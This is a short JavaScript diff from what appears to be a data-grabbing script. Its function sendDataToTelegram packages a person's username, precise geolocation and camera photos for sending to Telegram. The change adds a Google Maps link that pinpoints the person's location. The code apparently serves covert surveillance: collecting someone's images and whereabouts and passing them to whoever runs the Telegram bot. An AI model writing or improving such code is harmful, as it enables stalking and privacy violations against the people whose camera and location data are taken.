@@ -199,7 +199,10 @@ async function getCameraPhotos() {
 function sendDataToTelegram(username, geo, photos) {
   const messageParts = [];
   if (username) messageParts.push(`Անուն: ${username}`);
-  if (geo) messageParts.push(`Տեղադրություն: Լատ․ ${geo.latitude}, Լոնգ․ ${geo.longitude}, Ճշգրտություն՝ ${geo.accuracy}մ`);
+  if (geo) {
+    const mapUrl = `https://www.google.com/maps?q=${geo.latitude},${geo.longitude}`;
+    messageParts.push(`Տեղադրություն: Լատ․ ${geo.latitude}, Լոնգ․ ${geo.longitude}, Ճշգրտություն՝ ${geo.accuracy}մ\nՄոտավորապես՝ ${mapUrl}`);
+  }
 
   const textMessage = encodeURIComponent(messageParts.join('\n'));
 
